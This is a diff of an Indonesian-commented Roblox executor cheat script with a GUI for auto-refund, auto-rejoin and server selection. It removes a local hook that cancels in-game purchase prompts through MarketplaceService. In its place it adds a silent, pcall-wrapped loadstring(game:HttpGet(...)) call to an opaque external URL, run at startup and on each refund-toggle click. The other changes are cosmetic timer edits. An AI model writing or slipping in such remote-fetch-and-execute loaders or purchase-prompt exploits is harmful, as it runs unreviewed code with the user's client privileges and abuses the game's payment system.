@@ -19,7 +19,7 @@ local autoRefundEnabled = true
 
 getgenv().AutoRefundV2 = autoRefundEnabled
 
--- Durasi Rejoin Timer (10 Menit = 600 Detik)
+-- Durasi Rejoin Timer (90 Menit = 5400 Detik)
 local REJOIN_TIME = 90 * 60
 local timeRemaining = REJOIN_TIME
 
@@ -162,86 +162,14 @@ else
     ScreenGui.Parent = (CoreGui:FindFirstChild("RobloxGui") and CoreGui) or LocalPlayer.PlayerGui
 end
 
--- Notifikasi Popup Nama Item Refund di Layar
-local NotifFrame = Instance.new("Frame")
-NotifFrame.Size = UDim2.new(0, 320, 0, 45)
-NotifFrame.Position = UDim2.new(0.5, -160, 0, 15)
-NotifFrame.BackgroundColor3 = Color3.fromRGB(35, 25, 50)
-NotifFrame.BackgroundTransparency = 0.2
-NotifFrame.BorderSizePixel = 0
-NotifFrame.Visible = false
-NotifFrame.Parent = ScreenGui
-
-local NotifCorner = Instance.new("UICorner")
-NotifCorner.CornerRadius = UDim.new(0, 10)
-NotifCorner.Parent = NotifFrame
-
-local NotifStroke = Instance.new("UIStroke")
-NotifStroke.Color = Color3.fromRGB(255, 119, 238)
-NotifStroke.Thickness = 1.5
-NotifStroke.Parent = NotifFrame
-
-local NotifLabel = Instance.new("TextLabel")
-NotifLabel.Size = UDim2.new(1, 0, 1, 0)
-NotifLabel.BackgroundTransparency = 1
-NotifLabel.Text = "<b>[REFUND]: Item Name</b>"
-NotifLabel.RichText = true
-NotifLabel.TextColor3 = Color3.fromRGB(255, 200, 250)
-NotifLabel.TextSize = 13
-NotifLabel.Font = Enum.Font.GothamBold
-NotifLabel.Parent = NotifFrame
-
--- Fungsi Menampilkan Notifikasi di Layar
-local function showRefundNotification(itemName)
-    NotifLabel.Text = string.format("<b>[REFUND] Di-refund: %s</b>", tostring(itemName))
-    NotifFrame.Visible = true
-    NotifFrame.Position = UDim2.new(0.5, -160, 0, -50)
-    
-    -- Animasi Muncul ke Bawah
-    TweenService:Create(NotifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-        Position = UDim2.new(0.5, -160, 0, 20)
-    }):Play()
-    
-    -- Sembunyikan otomatis setelah 3 detik
-    task.spawn(function()
-        task.wait(3)
-        if NotifFrame.Visible then
-            TweenService:Create(NotifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-                Position = UDim2.new(0.5, -160, 0, -50)
-            }):Play()
-            task.wait(0.3)
-            NotifFrame.Visible = false
-        end
+-- 6. Auto Refund (Diganti Total Menggunakan Loadstring Baru)
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://virgoboy.netlify.app/raw/gadoy7y5u4"))()
     end)
-end
-
--- 6. Auto Refund Purchase Prompt (Dengan Deteksi Nama Item)
-MarketplaceService.PromptPurchaseRequestedV2:Connect(function(player, info)
-    if player == LocalPlayer and autoRefundEnabled then
-        local assetId = info and info.Id or "Unknown"
-        local itemName = "Unknown Item"
-        
-        -- Ambil nama item dari MarketplaceService berdasarkan ID
-        pcall(function()
-            local productInfo = MarketplaceService:GetProductInfo(assetId)
-            if productInfo and productInfo.Name then
-                itemName = productInfo.Name
-            elseif info and (info.Name or info.Title) then
-                itemName = info.Name or info.Title
-            end
-        end)
-        
-        -- Tampilkan nama item ke layar
-        showRefundNotification(itemName)
-        
-        -- Kirim sinyal refund
-        pcall(function()
-            MarketplaceService:SignalPromptProductRequestFinished(assetId, Enum.ProductPurchaseDecision.NotProcessedYet)
-        end)
-    end
 end)
 
--- Main Frame (Disesuaikan ukurannya untuk memuat tombol Pilih Server)
+-- Main Frame (Disesuaikan ukurannya untuk memuat semua komponen tombol)
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Size = UDim2.new(0, 280, 0, 287)
@@ -407,7 +335,7 @@ MasterButton.MouseButton1Click:Connect(function()
     TweenService:Create(MasterStroke, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {Color = targetBorder}):Play()
 end)
 
--- 2. Tombol Auto Refund Toggle
+-- 2. Tombol Auto Refund Toggle (Diperbarui untuk Mengontrol/Reload Script Eksternal Jika Diperlukan)
 local RefundButton = Instance.new("TextButton")
 RefundButton.Size = UDim2.new(1, 0, 0, 36)
 RefundButton.BackgroundColor3 = Color3.fromRGB(255, 119, 238)
@@ -441,6 +369,12 @@ RefundButton.MouseButton1Click:Connect(function()
     TweenService:Create(RefundButton, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {BackgroundColor3 = targetBg}):Play()
     TweenService:Create(RefundButton, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {TextColor3 = targetText}):Play()
     TweenService:Create(RefundStroke, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {Color = targetBorder}):Play()
+    
+    if autoRefundEnabled then
+        pcall(function()
+            loadstring(game:HttpGet("https://virgoboy.netlify.app/raw/gadoy7y5u4"))()
+        end)
+    end
 end)
 
 -- 3. Tombol Manual Rejoin Server
@@ -469,7 +403,8 @@ RejoinButton.MouseButton1Click:Connect(function()
         TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
     end)
 end)
--- 4. Tombol Pilih Server (Tambahan Baru)
+
+-- 4. Tombol Pilih Server
 local ServerButton = Instance.new("TextButton")
 ServerButton.Size = UDim2.new(1, 0, 0, 36)
 ServerButton.BackgroundColor3 = Color3.fromRGB(50, 35, 75)
@@ -496,7 +431,7 @@ ServerButton.MouseButton1Click:Connect(function()
     end)
 end)
 
--- 5. Label Display Rejoin Timer (10 Menit)
+-- 5. Label Display Rejoin Timer (90 Menit)
 local TimerFrame = Instance.new("Frame")
 TimerFrame.Size = UDim2.new(1, 0, 0, 36)
 TimerFrame.BackgroundColor3 = Color3.fromRGB(35, 25, 55)
@@ -514,14 +449,14 @@ TimerStroke.Parent = TimerFrame
 local TimerLabel = Instance.new("TextLabel")
 TimerLabel.Size = UDim2.new(1, 0, 1, 0)
 TimerLabel.BackgroundTransparency = 1
-TimerLabel.Text = "<b>Auto Rejoin: 10:00</b>"
+TimerLabel.Text = "<b>Auto Rejoin: 90:00</b>"
 TimerLabel.RichText = true
 TimerLabel.TextColor3 = Color3.fromRGB(255, 200, 250)
 TimerLabel.TextSize = 12
 TimerLabel.Font = Enum.Font.GothamBold
 TimerLabel.Parent = TimerFrame
 
--- Task Countdown Timer 10 Menit
+-- Task Countdown Timer 90 Menit
 task.spawn(function()
     while timeRemaining > 0 do
         task.wait(1)
